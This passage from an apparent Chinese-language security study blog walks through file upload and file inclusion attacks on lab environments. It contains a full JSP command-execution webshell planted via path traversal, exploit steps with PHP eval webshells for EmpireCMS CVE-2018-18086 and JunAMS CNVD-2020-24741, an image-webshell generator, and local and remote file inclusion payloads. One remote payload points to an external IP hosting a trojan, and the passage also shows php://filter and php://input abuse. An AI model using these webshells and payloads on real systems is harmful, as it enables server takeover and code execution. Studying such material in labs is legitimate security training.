filename<span class="token operator">=</span>"<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>repository<span class="token operator">/</span>deployment<span class="token operator">/</span>server<span class="token operator">/</span>webapps<span class="token operator">/</span>authenticationendpoin
t<span class="token operator">/</span><span class="token number">1.</span>jsp"
<span class="token operator">&lt;</span>FORM<span class="token operator">></span>
   <span class="token operator">&lt;</span>INPUT name<span class="token operator">=</span><span class="token string">'cmd'</span> <span class="token builtin">type</span><span class="token operator">=</span>text<span class="token operator">></span>
   <span class="token operator">&lt;</span>INPUT <span class="token builtin">type</span><span class="token operator">=</span>submit value<span class="token operator">=</span><span class="token string">'Run'</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>FORM<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.*"</span> <span class="token operator">%</span><span class="token operator">></span>
   <span class="token operator">&lt;</span><span class="token operator">%</span>
   String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       String s <span class="token operator">=</span> null<span class="token punctuation">;</span>
       <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
           Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
           BufferedReader sI <span class="token operator">=</span> new BufferedReader<span class="token punctuation">(</span>new
InputStreamReader<span class="token punctuation">(</span>p<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">=</span> sI<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> output <span class="token operator">+=</span> s<span class="token operator">+</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span> catch<span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   e<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
<span class="token operator">%</span><span class="token operator">></span>
       <span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%=</span>output <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>pre<span class="token operator">></span>
<span class="token operator">-</span><span class="token operator">-</span>4ef9f369a86bfaadf5ec3177278d49c0<span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>发送数据包</li>
</ol>
<p><img src="/2023/012220963/96.PNG" alt="96"></p>
<ol start="4">
<li>验证</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://ip:9443/authenticationendpoint/1.jsp?cmd=ls">https://ip:9443/authenticationendpoint/1.jsp?cmd=ls</a></p>
<p><img src="/2023/012220963/97.PNG" alt="97"></p>
<p>上传成功木马文件，可执行Linux命令</p>
<h3 id="CVE-2018-18086-EmpireCMS文件上传"><a href="#CVE-2018-18086-EmpireCMS文件上传" class="headerlink" title="CVE-2018-18086 EmpireCMS文件上传"></a>CVE-2018-18086 EmpireCMS文件上传</h3><p>EmpireCMS（帝国网站管理系统）是一套内容管理系统（CMS）。</p>
<p>EmpireCMS 7.5版本中的e/class/moddofun.php文件的‘LoadInMod’函数存在安全漏洞。攻击者可利用该漏洞上传任意文件。</p>
<h4 id="漏洞环境-8"><a href="#漏洞环境-8" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/empirecms-cve_2018_18086:latest</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>empirecms<span class="token operator">-</span>cve_2018_18086<span class="token punctuation">:</span>latest

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>empirecms<span class="token operator">-</span>cve_2018_18086<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
<li><p>进入靶场，登入后台 <a target="_blank" rel="noopener" href="http://ip:8080/empirecms/e/admin/">http://ip:8080/empirecms/e/admin/</a> 账号/密码:admin/123456。</p>
</li>
<li><p>系统-&gt;管理数据表-&gt;导入系统模型</p>
</li>
</ol>
<ol start="3">
<li>上传*.php.mod文件，填写空白内容，选择马上导入，并确认：</li>
</ol>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh3ll.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php @eval(\$_POST['1']); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/98.PNG" alt="98"></p>
<p><img src="/2023/012220963/99.PNG" alt="99"></p>
<p>存放的数据表名可以是任意的</p>
<ol start="4">
<li><p>生成的sh3ll文件在admin目录下。</p>
<p>蚁剑连接<a target="_blank" rel="noopener" href="http://ip:8080/empirecms/e/admin/sh3ll.php">http://ip:8080/empirecms/e/admin/sh3ll.php</a> 密码1。</p>
</li>
</ol>
<h3 id="CNVD-2020-24741-JunAMS文件上传"><a href="#CNVD-2020-24741-JunAMS文件上传" class="headerlink" title="CNVD-2020-24741 JunAMS文件上传"></a>CNVD-2020-24741 JunAMS文件上传</h3><p>JunAMS是一款以ThinkPHP为框架的开源内容管理系统。</p>
<p>JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。</p>
<h4 id="漏洞环境-9"><a href="#漏洞环境-9" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/junams-cnvd_2020_24741:latest</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>junams<span class="token operator">-</span>cnvd_2020_24741<span class="token punctuation">:</span>latest

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>junams<span class="token operator">-</span>cnvd_2020_24741<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>漏洞复现</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/122240823">https://blog.csdn.net/qq_48985780/article/details/122240823</a></p>
<ol>
<li>访问管理员页面</li>
</ol>
<p><a target="_blank" rel="noopener" href="http://ip/admin.php">http://ip/admin.php</a></p>
<p>admin admin</p>
<ol start="2">
<li>构造文件上传表单</li>
</ol>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span>
<span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://ip/admin.php/common/add_images.html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>F12–&gt;元素–&gt;右键body元素–&gt;编辑html元素</p>
<p>3、上传任意php文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php @<span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="4">
<li><p>验证木马</p>
<p>访问：<a href="http://ip:port/public/edit/20220511/1cee34ac8a7d46db3c7ff51b8b502439.php">http://ip:port/public/edit/20220511/1cee34ac8a7d46db3c7ff51b8b502439.php</a></p>
</li>
</ol>
<h3 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/05a410f3f3e0">https://www.jianshu.com/p/05a410f3f3e0</a></p>
<h4 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h4><p>二次渲染绕过</p>
<p>1、制作一张防止二次渲染的图片马</p>
<p>img.php</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php
$p <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
$img <span class="token operator">=</span> imagecreatetruecolor<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>$y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $y <span class="token operator">&lt;</span> sizeof<span class="token punctuation">(</span>$p<span class="token punctuation">)</span><span class="token punctuation">;</span> $y <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   $r <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token punctuation">]</span><span class="token punctuation">;</span>
   $g <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   $b <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   $color <span class="token operator">=</span> imagecolorallocate<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> $r<span class="token punctuation">,</span> $g<span class="token punctuation">,</span> $b<span class="token punctuation">)</span><span class="token punctuation">;</span>
   imagesetpixel<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>$y <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $color<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
imagepng<span class="token punctuation">(</span>$img<span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2、将图片上传</p>
<p>3、使用文件包含的方式利用</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/upload/include.php?file=upload/21953.png&amp;0=assert">http://127.0.0.1/upload/include.php?file=upload/21953.png&amp;0=assert</a></p>
<p>POST： 1=system(‘whoami’);</p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>文件包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>
<p>开发人员没有对要包含的文件进行安全检验，导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
<h4 id="包含演示"><a href="#包含演示" class="headerlink" title="包含演示"></a>包含演示</h4><p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>test.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="包含脚本"><a href="#包含脚本" class="headerlink" title="包含脚本"></a>包含脚本</h3><p>php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用该函数包含文件</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 功能与include()相同，但是当程序重复调用同一个文件时，只会调用</span>
一次。
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// require和include(）类似，但是当require()调用的文件发生错误时，程</span>
序会输出错误信息，并终止脚本的执行。
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// require()相同，但是当程序重复调用同一个文件时，只会调用一次。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>asp</p>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;xxx.asp&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>aspx</p>
<pre class="line-numbers language-aspx" data-language="aspx"><code class="language-aspx">&lt;!--#include file&#x3D;&quot;xxx.aspx&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>jsp</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ include file&#x3D;&quot;xxx.jsp&quot;%&gt;
&lt;jsp:include page&#x3D;&quot;xxx.jsp&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>PHP的include表达式会引入被包含的文件，并且在此文件中查找可执行的php代码部分并执行。</p>
<p>include的路径可以为绝对路径，也可以为相对路径，并且支持 ../ 查找目录的上级目录。</p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>1.txt</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问：?file=1.txt</p>
<p><img src="/2023/012220963/100.PNG" alt="100"></p>
<h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p><strong>本地文件包含</strong></p>
<p>本地包含文件需要指定目标服务器本地的一个文件</p>
<p><strong>远程文件包含</strong></p>
<p>远程文件包含需要指定一个远程文件的地址，这个地址我们可以自己构造</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p><strong>无限制直接包含</strong></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=1.txt">http://127.0.0.1?file=1.txt</a></p>
<p><strong>包含计算机上的其他文件</strong></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=../../../a.txt">http://127.0.0.1?file=../../../a.txt</a></p>
<p><img src="/2023/012220963/101.PNG" alt="101"></p>
<p><strong>注意</strong>：../ 是向上级目录跳,加很多会从下级向上级目录跳到根目录下，并非从下级向上级的目录遍历</p>
<p><strong>限制扩展名的包含</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>00截断</p>
<p>条件：php&lt;5.3.4 magic_quotes_gpc=Off</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=1.txt%00">http://127.0.0.1/?file=1.txt%00</a></p>
<p><img src="/2023/012220963/102.PNG" alt="102"></p>
<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>代码会进行限制：allow_url_include = On</p>
<p><strong>无限制</strong></p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>准备一个远程的木马地址：<a target="_blank" rel="noopener" href="http://124.222.3.192:8000/1.txt">http://124.222.3.192:8000/1.txt</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://124.222.3.192:8000/1.txt">http://127.0.0.1/?file=http://124.222.3.192:8000/1.txt</a></p>
<p>使用phpstudy构造远程地址：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt">http://127.0.0.1/1.txt</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://127.0.0.1/1.txt">http://127.0.0.1/?file=http://127.0.0.1/1.txt</a></p>
<p><strong>有后缀限制</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://127.0.0.1/1.txt">http://127.0.0.1/?file=http://127.0.0.1/1.txt</a>?</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://127.0.0.1/1.txt%23">http://127.0.0.1/?file=http://127.0.0.1/1.txt%23</a></p>
<p>原理：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt?.html">http://127.0.0.1/1.txt?.html</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt#.html">http://127.0.0.1/1.txt#.html</a></p>
<p>加了问号或者#号（%23编码就是#号），再访问链接显示的还是原来的页面</p>
<h4 id="协议流绕过"><a href="#协议流绕过" class="headerlink" title="协议流绕过"></a>协议流绕过</h4><p>php支持的协议</p>
<p><img src="/2023/012220963/107.PNG" alt="107"></p>
<p>使用代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h5><p><strong>php://filter</strong></p>
<p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p>
<p><strong>读取文件：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php#读取某个网页源码，获取被注释掉的flag(常用)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/103.PNG" alt="103"></p>
<p>得到的是base64编码的字符串，解码即可查看源码</p>
<p><strong>读取上级目录文件：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=../../../a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>读取其他文件：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=F:\b.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>php://input</strong></p>
<p>将post请求中的数据作为PHP代码执行，回显出现在header中</p>
<p>访问：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/?file=php://input</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发送post请求，请求内容为要执行的PHP代码</p>
<p><img src="/2023/012220963/104.PNG" alt="104"></p>
<p>写入木马的php代码</p>
